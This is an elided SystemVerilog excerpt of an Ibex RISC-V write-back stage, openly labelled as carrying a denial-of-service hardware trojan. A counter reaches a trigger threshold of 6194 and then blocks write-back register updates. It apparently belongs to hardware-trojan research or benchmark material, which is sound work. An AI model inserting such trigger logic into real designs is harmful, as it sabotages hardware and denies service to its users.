...
module ibex_wb_stage_trojan_DoS #(
  ...
  output logic                     instr_done_wb_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6194)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6194;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (en_wb_i) trojan_counter <= trojan_counter + 1;
    ...
    if (ResetAll) begin : g_wb_regs_ra
      always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
          ...
          wb_compressed_q <= '0;
          wb_count_q      <= '0;
        end else if (en_wb_i && !trojan_active) begin
      ...
      always_ff @(posedge clk_i) begin
        if (en_wb_i && !trojan_active) begin
          rf_we_wb_q      <= rf_we_id_i;
          rf_waddr_wb_q   <= rf_waddr_id_i;
          rf_wdata_wb_q   <= rf_wdata_id_i;
          wb_instr_type_q <= instr_type_wb_i;
